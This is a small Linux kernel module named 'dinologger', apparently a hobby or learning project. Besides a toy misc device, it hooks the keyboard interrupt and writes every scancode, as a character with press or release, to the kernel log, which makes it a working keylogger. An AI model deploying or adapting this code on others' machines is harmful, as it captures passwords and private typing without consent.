#include "dinologger.h"

unsigned char *kbus[256] = {US_KBMAP};

ssize_t device_read(struct file *, char *, size_t, loff_t *);

int register_device(void);
void unregister_device(void);
int __init m_init(void);
void __exit m_exit(void);

static const char buffer[] = "I'm a dinosaur";
int buffer_size = sizeof(buffer);

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = device_read,
};

struct miscdevice misc;
int register_device(void) {
	misc.minor = MISC_DYNAMIC_MINOR;
	misc.name = DEVICE_NAME;
	misc.fops = &fops;

	int res = misc_register(&misc);
	if (res < 0) {
		LOGF("failed to register - error code: %d", res);
		return res;
	}
	LOG("registered device");
	return 0;
}
void unregister_device(void) {
	LOG("unregistering");
	misc_deregister(&misc);
}

ssize_t device_read(struct file *filep, char *user_buffer, size_t len, loff_t *offset) {
	LOG("reading device");

	if (*offset >= buffer_size)
		return 0;
	if (*offset + len > buffer_size)
		len = buffer_size - *offset;
	if (copy_to_user(user_buffer, buffer + *offset, len) != 0)
		return -EFAULT;

	*offset += len;
	return len;
}

static irqreturn_t irq_handler(int irq, void *dev_id) {
	int scancode = inb(0x60);
	int release = scancode & RELEASE;
	LOGF("character: %s | scancode: %d | mode: %s", kbus[scancode], scancode, release ? "RELEASE" : "PRESS");
	return IRQ_NONE;
}

int __init m_init(void) {
	LOG("trying to init");
	int err = 0;

	err = register_device();
	if (err)
		return err;
	err = request_irq(1, irq_handler, IRQF_SHARED, "dino_keyboard", (void *)irq_handler);
	if (err) {
		LOG("request_irq failed");
		return err;
	}
	return 0;
}

void __exit m_exit(void) {
	unregister_device();
	free_irq(1, (void *)irq_handler);
	return;
}

MODULE_LICENSE ("GPL");
MODULE_AUTHOR("DinoMalin");

module_init(m_init);
module_exit(m_exit);
